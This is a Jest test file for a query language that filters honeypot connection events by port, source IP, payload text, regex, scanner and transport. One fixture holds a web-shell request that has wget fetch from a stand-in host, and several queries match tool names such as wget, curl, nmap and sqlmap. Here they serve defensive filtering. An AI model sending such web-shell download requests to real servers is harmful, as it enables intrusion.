import { describe, expect, test } from '@jest/globals';
import { parseDSL, productions } from '../dsl';
import { filterEvent } from '../eventFilter';
import { generateTestEvent } from '../util';

describe('parseDSL', () => {
    test('parses AND query', () => {
        let sx = parseDSL('tcp.port eq 23 and ip.src eq 1.1.1.1');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);

        // console.log(JSON.stringify(sx, null, 2));
        expect(sx.toString()).toBeTruthy();
        expect(filterEvent(generateTestEvent(23, '123', '1.1.1.1'), sx.cst!)).toBeTruthy();
    });

    test('parses ip.src ==', () => {
        // console.dir(parseDSL('tcp.port eq 23 and tcp.port eq 445'));
        let sx = parseDSL('ip.src eq 192.168.1.1 and tcp.port eq 445');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        // console.log(JSON.stringify(sx, null, 2));
        expect(sx.toString()).toBeTruthy();
        expect(filterEvent(generateTestEvent(445, '123', '192.168.1.1'), sx.cst!)).toBeTruthy();
    });

    test('parses single query with "ne port"', () => {
        let sx = parseDSL('tcp.port ne 23');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        // console.log(JSON.stringify(sx, null, 2));
        expect(sx.toString()).toBeTruthy();
        expect(filterEvent(generateTestEvent(445, '', '192.168.1.1'), sx.cst!)).toBeTruthy();
    });

    test('parses single query with "ne port"', () => {
        let sx = parseDSL('udp.port ne 8080');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        expect(sx.toString()).toBeTruthy();
        expect(
            filterEvent(generateTestEvent(445, '', '192.168.1.1', '', 'Rule: UDP'), sx.cst!),
        ).toBeTruthy();
    });

    test('returns lexer error', () => {
        let sx = parseDSL('cdp.port ne 8080');
        expect(sx.lexErrors.length).toBeGreaterThan(0);
        expect(sx.parseErrors).toHaveLength(0);
    });

    test('returns parser error', () => {
        let sx = parseDSL('tcp.port ne tcp.port');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors.length).toBe(1);
    });

    test('does not parse consecutive queries', () => {
        let sx = parseDSL('tcp.port eq 23 tcp.port eq 445');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors.length).toBeGreaterThanOrEqual(1);
    });

    test('parsing payload', () => {
        let sx = parseDSL('payload contains "something"');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        let payload = Buffer.from('something').toString('base64');
        expect(
            filterEvent(generateTestEvent(445, '123', '192.168.1.1', payload), sx.cst!),
        ).toBeTruthy();
    });

    test('parsing payload ne', () => {
        let sx = parseDSL('not payload contains "banana"');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        let payload = Buffer.from('something').toString('base64');
        expect(
            filterEvent(generateTestEvent(445, '123', '192.168.1.1', payload), sx.cst!),
        ).toBeTruthy();
    });

    test('payload contains and tcp.port', () => {
        let sx = parseDSL('payload contains "something" and tcp.port == 445');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        let payload = Buffer.from('something').toString('base64');
        expect(
            filterEvent(generateTestEvent(445, '123', '192.168.1.1', payload), sx.cst!),
        ).toBeTruthy();
    });

    test('parsing payload ne and tcp.port eq', () => {
        let sx = parseDSL('not payload contains "banana" and tcp.port != 445');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        let payload = Buffer.from('something').toString('base64');
        expect(
            filterEvent(generateTestEvent(445, '123', '192.168.1.1', payload), sx.cst!),
        ).toBeFalsy();
    });

    test('parsing payload with spaces, slashes and punctuation', () => {
        let sx = parseDSL('payload contains "GET / HTTP/1.1"');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        let payload = Buffer.from('GET / HTTP/1.1\r\nHost: example.com\r\n').toString('base64');
        expect(
            filterEvent(generateTestEvent(80, '123', '192.168.1.1', payload), sx.cst!),
        ).toBeTruthy();
    });

    test('parsing payload with IP address string', () => {
        let sx = parseDSL('payload contains "192.168.1.1"');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        let payload = Buffer.from('connecting to 192.168.1.1:80').toString('base64');
        expect(
            filterEvent(generateTestEvent(80, '123', '10.0.0.1', payload), sx.cst!),
        ).toBeTruthy();
    });

    test('parsing payload with escaped quotes', () => {
        let sx = parseDSL('payload contains "hello \\"world\\""');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        let payload = Buffer.from('hello "world"').toString('base64');
        expect(
            filterEvent(generateTestEvent(80, '123', '10.0.0.1', payload), sx.cst!),
        ).toBeTruthy();
    });

    test('parsing endReason with spaces', () => {
        let sx = parseDSL('end.reason == "connection reset by peer"');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        expect(
            filterEvent(
                generateTestEvent(80, '123', '1.1.1.1', undefined, 'Rule: TCP', {
                    endReason: 'connection reset by peer',
                }),
                sx.cst!,
            ),
        ).toBeTruthy();
    });

    test('ip.dst is no longer a valid field', () => {
        // Removed: dstHost is stripped from every event, so ip.dst could never match.
        let sx = parseDSL('ip.dst eq 198.51.100.8');
        expect(sx.lexErrors.length + sx.parseErrors.length).toBeGreaterThan(0);
    });

    test('ip.src still filters on srcHost', () => {
        let sx = parseDSL('ip.src eq 192.168.1.1');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        expect(filterEvent(generateTestEvent(80, '123', '192.168.1.1'), sx.cst!)).toBeTruthy();
        expect(filterEvent(generateTestEvent(80, '123', '10.0.0.1'), sx.cst!)).toBeFalsy();
    });

    test('parses tcp.port against transport rather than rule text', () => {
        let sx = parseDSL('tcp.port == 445');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        // A TCP session on 445 whose rule names the handler, not the protocol.
        expect(
            filterEvent(
                generateTestEvent(445, '123', '192.168.1.1', undefined, 'Rule: SMB', {
                    transport: 'tcp',
                }),
                sx.cst!,
            ),
        ).toBeTruthy();
        // transport wins over the rule text when the two disagree.
        expect(
            filterEvent(
                generateTestEvent(445, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    transport: 'udp',
                }),
                sx.cst!,
            ),
        ).toBeFalsy();
    });

    test('parses end.reason', () => {
        let sx = parseDSL('end.reason eq "client_close"');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        expect(
            filterEvent(
                generateTestEvent(80, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    endReason: 'client_close',
                }),
                sx.cst!,
            ),
        ).toBeTruthy();
        expect(
            filterEvent(
                generateTestEvent(80, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    endReason: 'timeout',
                }),
                sx.cst!,
            ),
        ).toBeFalsy();
    });

    test('parses handler', () => {
        let sx = parseDSL('handler eq "http"');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        expect(
            filterEvent(
                generateTestEvent(80, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    handler: 'http',
                }),
                sx.cst!,
            ),
        ).toBeTruthy();
        expect(
            filterEvent(
                generateTestEvent(80, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    handler: 'smb',
                }),
                sx.cst!,
            ),
        ).toBeFalsy();
        expect(
            filterEvent(
                generateTestEvent(80, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    handler: undefined,
                }),
                sx.cst!,
            ),
        ).toBeFalsy();
    });

    test('handler matches any layer of the stack', () => {
        const eq = parseDSL('handler eq "http"');
        const ne = parseDSL('handler ne "http"');
        const stacked = generateTestEvent(1080, '123', '192.168.1.1', undefined, 'Rule: TCP', {
            handler: 'socks',
            handlers: ['tcp', 'tls', 'socks', 'http'],
        });
        expect(filterEvent(stacked, eq.cst!)).toBeTruthy();
        expect(filterEvent(stacked, ne.cst!)).toBeFalsy();
    });

    test('parses scanner', () => {
        let sx = parseDSL('scanner eq "censys"');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        expect(
            filterEvent(
                generateTestEvent(80, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    scanner: 'censys',
                }),
                sx.cst!,
            ),
        ).toBeTruthy();
        // Case insensitive.
        expect(
            filterEvent(
                generateTestEvent(80, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    scanner: 'Censys',
                }),
                sx.cst!,
            ),
        ).toBeTruthy();
        expect(
            filterEvent(
                generateTestEvent(80, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    scanner: 'shodan',
                }),
                sx.cst!,
            ),
        ).toBeFalsy();
    });

    test('scanner ne matches events with no detected scanner', () => {
        // The core use: hide known scanners to surface unclassified (real) activity.
        let sx = parseDSL('scanner ne "censys"');
        expect(sx.parseErrors).toHaveLength(0);
        expect(
            filterEvent(
                generateTestEvent(80, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    scanner: undefined,
                }),
                sx.cst!,
            ),
        ).toBeTruthy();
        expect(
            filterEvent(
                generateTestEvent(80, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    scanner: 'censys',
                }),
                sx.cst!,
            ),
        ).toBeFalsy();
    });

    test('parses transport', () => {
        let sx = parseDSL('transport eq "udp"');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        expect(
            filterEvent(
                generateTestEvent(53, '123', '192.168.1.1', undefined, 'Rule: UDP', {
                    transport: 'udp',
                }),
                sx.cst!,
            ),
        ).toBeTruthy();
        expect(
            filterEvent(
                generateTestEvent(80, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    transport: 'tcp',
                }),
                sx.cst!,
            ),
        ).toBeFalsy();
        // Events that never reported a transport cannot match one.
        expect(
            filterEvent(
                generateTestEvent(80, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    transport: undefined,
                }),
                sx.cst!,
            ),
        ).toBeFalsy();
    });

    test('transport comparison ignores case', () => {
        let sx = parseDSL('transport eq "udp"');
        expect(sx.parseErrors).toHaveLength(0);
        expect(
            filterEvent(
                generateTestEvent(53, '123', '192.168.1.1', undefined, 'Rule: UDP', {
                    transport: 'UDP',
                }),
                sx.cst!,
            ),
        ).toBeTruthy();
    });

    test('excludes a transport with ne', () => {
        let sx = parseDSL('transport ne "tcp"');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        expect(
            filterEvent(
                generateTestEvent(53, '123', '192.168.1.1', undefined, 'Rule: UDP', {
                    transport: 'udp',
                }),
                sx.cst!,
            ),
        ).toBeTruthy();
        expect(
            filterEvent(
                generateTestEvent(80, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    transport: 'tcp',
                }),
                sx.cst!,
            ),
        ).toBeFalsy();
    });

    test('combines transport with other clauses', () => {
        let sx = parseDSL('transport eq "udp" and udp.port == 53');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        expect(
            filterEvent(
                generateTestEvent(53, '123', '192.168.1.1', undefined, 'Rule: UDP', {
                    transport: 'udp',
                }),
                sx.cst!,
            ),
        ).toBeTruthy();
        expect(
            filterEvent(
                generateTestEvent(53, '123', '192.168.1.1', undefined, 'Rule: TCP', {
                    transport: 'tcp',
                }),
                sx.cst!,
            ),
        ).toBeFalsy();
    });
});

// Glutton only sets `rule`/`ruleName` when one of its rules matched the connection,
// so an event that matched no rule reaches the filter without them. Clauses that do
// not talk about the protocol must still be evaluated for those events.
describe('filterEvent on events that matched no rule', () => {
    const noRule = () =>
        generateTestEvent(
            445,
            '54321',
            '203.0.113.10',
            Buffer.from('something').toString('base64'),
            undefined,
            {
                rule: undefined,
                transport: 'tcp',
                endReason: 'timeout',
            },
        );

    test('evaluates ip.src', () => {
        let sx = parseDSL('ip.src eq 203.0.113.10');
        expect(sx.parseErrors).toHaveLength(0);
        expect(filterEvent(noRule(), sx.cst!)).toBeTruthy();
    });

    test('evaluates payload contains', () => {
        let sx = parseDSL('payload contains "something"');
        expect(sx.parseErrors).toHaveLength(0);
        expect(filterEvent(noRule(), sx.cst!)).toBeTruthy();
    });

    test('evaluates end.reason', () => {
        let sx = parseDSL('end.reason eq "timeout"');
        expect(sx.parseErrors).toHaveLength(0);
        expect(filterEvent(noRule(), sx.cst!)).toBeTruthy();
    });

    test('evaluates tcp.port using transport', () => {
        let sx = parseDSL('tcp.port == 445');
        expect(sx.parseErrors).toHaveLength(0);
        expect(filterEvent(noRule(), sx.cst!)).toBeTruthy();
    });

    test('evaluates a compound query', () => {
        let sx = parseDSL('tcp.port == 445 and ip.src eq 203.0.113.10');
        expect(sx.parseErrors).toHaveLength(0);
        expect(filterEvent(noRule(), sx.cst!)).toBeTruthy();
    });
});

describe('parenthesized groups', () => {
    const fromSrc = (port: number, src: string) => generateTestEvent(port, '123', src);

    test('groups an or before an and', () => {
        let sx = parseDSL('(ip.src eq 1.1.1.1 or ip.src eq 2.2.2.2) and tcp.port == 22');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        expect(filterEvent(fromSrc(22, '1.1.1.1'), sx.cst!)).toBeTruthy();
        expect(filterEvent(fromSrc(22, '2.2.2.2'), sx.cst!)).toBeTruthy();
        expect(filterEvent(fromSrc(22, '3.3.3.3'), sx.cst!)).toBeFalsy();
        // Without the group this would read as 1.1.1.1 or (2.2.2.2 and port 22).
        expect(filterEvent(fromSrc(80, '1.1.1.1'), sx.cst!)).toBeFalsy();
    });

    test('negates a whole group', () => {
        let sx = parseDSL('not (tcp.port == 22 or tcp.port == 23)');
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        expect(filterEvent(fromSrc(22, '1.1.1.1'), sx.cst!)).toBeFalsy();
        expect(filterEvent(fromSrc(23, '1.1.1.1'), sx.cst!)).toBeFalsy();
        expect(filterEvent(fromSrc(80, '1.1.1.1'), sx.cst!)).toBeTruthy();
    });

    test('supports nested groups', () => {
        let sx = parseDSL(
            '((tcp.port == 22 or tcp.port == 23) and ip.src eq 1.1.1.1) or ip.src eq 9.9.9.9',
        );
        expect(sx.lexErrors).toHaveLength(0);
        expect(sx.parseErrors).toHaveLength(0);
        expect(filterEvent(fromSrc(23, '1.1.1.1'), sx.cst!)).toBeTruthy();
        expect(filterEvent(fromSrc(80, '9.9.9.9'), sx.cst!)).toBeTruthy();
        expect(filterEvent(fromSrc(80, '1.1.1.1'), sx.cst!)).toBeFalsy();
    });

    test('rejects unbalanced parentheses', () => {
        expect(parseDSL('(tcp.port == 22').parseErrors.length).toBeGreaterThan(0);
        expect(parseDSL('tcp.port == 22)').parseErrors.length).toBeGreaterThan(0);
        expect(parseDSL('()').parseErrors.length).toBeGreaterThan(0);
    });

    test('suggests closing an open group', () => {
        const filterState = { suggestions: [], partialToken: null };
        parseDSL('(tcp.port == 22 ', filterState);
        expect(filterState.suggestions).toEqual(['and', 'or', ')']);
        parseDSL('(tcp.port == 22) ', filterState);
        expect(filterState.suggestions).toEqual(['and', 'or']);
        parseDSL('not ', filterState);
        expect(filterState.suggestions).toContain('(');
    });

    test('suggests an example value for each string field', () => {
        const filterState = { suggestions: [], partialToken: null };
        for (const [field, hint] of [
            ['end.reason', '"timeout"'],
            ['handler', '"http"'],
            ['transport', '"tcp"'],
            ['scanner', '"censys"'],
        ]) {
            parseDSL(`${field} eq `, filterState);
            expect(filterState.suggestions).toEqual([hint]);
        }
    });

    test('payload matches runs a regular expression over the payload', () => {
        const payload = Buffer.from('GET /shell.php?cmd=wget http://x/y').toString('base64');
        const event = generateTestEvent(80, '123', '192.168.1.1', payload);
        const run = (q: string) => {
            const sx = parseDSL(q);
            expect(sx.lexErrors).toHaveLength(0);
            expect(sx.parseErrors).toHaveLength(0);
            expect(sx.regexErrors).toHaveLength(0);
            return filterEvent(event, sx.cst!);
        };

        expect(run('payload matches "wget|curl"')).toBeTruthy();
        expect(run('payload ~ "wget|curl"')).toBeTruthy();
        expect(run('payload matches "^GET /[^ ]*\\.php"')).toBeTruthy();
        expect(run('payload matches "nmap|sqlmap"')).toBeFalsy();
        // The pattern is a regex, not a substring: an anchor and an alternation prove it.
        expect(run('payload matches "^wget"')).toBeFalsy();
        expect(run('payload contains "wget|curl"')).toBeFalsy();
    });

    test('payload matches composes with not and and', () => {
        const payload = Buffer.from('POST /admin').toString('base64');
        const event = generateTestEvent(445, '123', '192.168.1.1', payload);

        let sx = parseDSL('not payload matches "^GET" and tcp.port == 445');
        expect(sx.parseErrors).toHaveLength(0);
        expect(filterEvent(event, sx.cst!)).toBeTruthy();

        sx = parseDSL('payload matches "^(GET|POST)" and tcp.port == 445');
        expect(sx.parseErrors).toHaveLength(0);
        expect(filterEvent(event, sx.cst!)).toBeTruthy();
    });

    test('an invalid regex is reported instead of throwing', () => {
        const bad = parseDSL('payload matches "("');
        expect(bad.lexErrors).toHaveLength(0);
        expect(bad.parseErrors).toHaveLength(0);
        expect(bad.regexErrors.length).toBeGreaterThan(0);

        // A valid pattern, and `contains`, leave regexErrors empty.
        expect(parseDSL('payload matches "(ok)"').regexErrors).toHaveLength(0);
        expect(parseDSL('payload contains "("').regexErrors).toHaveLength(0);
    });

    test('suggests contains and matches after payload', () => {
        const filterState = { suggestions: [], partialToken: null };
        parseDSL('payload ', filterState);
        expect(filterState.suggestions).toEqual(['contains', 'matches']);
        parseDSL('payload matches ', filterState);
        expect(filterState.suggestions).toEqual(['"regex"']);
        parseDSL('payload ~ ', filterState);
        expect(filterState.suggestions).toEqual(['"regex"']);
        parseDSL('payload contains ', filterState);
        expect(filterState.suggestions).toEqual(['"msg"']);
    });
    test('a pattern keeps its backslashes', () => {
        const run = (text: string, query: string) => {
            const payload = Buffer.from(text).toString('base64');
            const sx = parseDSL(query);
            expect(sx.parseErrors).toHaveLength(0);
            expect(sx.regexErrors).toHaveLength(0);
            return filterEvent(generateTestEvent(80, '123', '192.168.1.1', payload), sx.cst!);
        };

        // \. is a literal dot. Unescaping the pattern first would leave a bare . here, which
        // matches any character, so the second case is what shows the backslash survived.
        expect(run('GET /shell.php', 'payload ~ "shell\\.php"')).toBeTruthy();
        expect(run('GET /shellXphp', 'payload ~ "shell\\.php"')).toBeFalsy();

        // \d would arrive as a plain d, and \b as a backspace, if the pattern were unescaped.
        expect(run('cmd=1234', 'payload ~ "cmd=\\d+"')).toBeTruthy();
        expect(run('cmd=abcd', 'payload ~ "cmd=\\d+"')).toBeFalsy();
        expect(run('run wget now', 'payload ~ "\\bwget\\b"')).toBeTruthy();
        expect(run('downloadwgetter', 'payload ~ "\\bwget\\b"')).toBeFalsy();

        // An escaped quote still reaches the expression as a quote.
        expect(run('say "hi"', 'payload ~ "say \\"hi\\""')).toBeTruthy();
    });

    test('a leading (?i) makes the pattern case insensitive', () => {
        const payload = Buffer.from('GET /x?cmd=WgEt').toString('base64');
        const event = generateTestEvent(80, '123', '192.168.1.1', payload);
        const run = (query: string) => {
            const sx = parseDSL(query);
            expect(sx.regexErrors).toHaveLength(0);
            return filterEvent(event, sx.cst!);
        };

        expect(run('payload matches "(?i)wget"')).toBeTruthy();
        // Without the flag a pattern is case sensitive, which is the default.
        expect(run('payload matches "wget"')).toBeFalsy();
    });

    test('a pattern matches characters, not bytes', () => {
        const payload = Buffer.from('GET /café ü', 'utf8').toString('base64');
        const event = generateTestEvent(80, '123', '192.168.1.1', payload);
        const run = (query: string) => {
            const sx = parseDSL(query);
            expect(sx.regexErrors).toHaveLength(0);
            return filterEvent(event, sx.cst!);
        };

        expect(run('payload matches "café"')).toBeTruthy();
        // é is two bytes, so matching bytes would need two dots to cover it.
        expect(run('payload ~ "caf.$"')).toBeFalsy();
        expect(run('payload ~ "caf. ü$"')).toBeTruthy();
    });

    test('only the start of a long payload is matched', () => {
        const payload = Buffer.from('a'.repeat(16 * 1024) + 'needle').toString('base64');
        const event = generateTestEvent(80, '123', '192.168.1.1', payload);
        const run = (query: string) => {
            const sx = parseDSL(query);
            expect(sx.regexErrors).toHaveLength(0);
            return filterEvent(event, sx.cst!);
        };

        // Beyond the cap that keeps a slow pattern from locking up the page.
        expect(run('payload matches "needle"')).toBeFalsy();
        expect(run('payload matches "^a+"')).toBeTruthy();
        // contains is a plain substring test, so it is not capped.
        expect(run('payload contains "needle"')).toBeTruthy();
    });
});
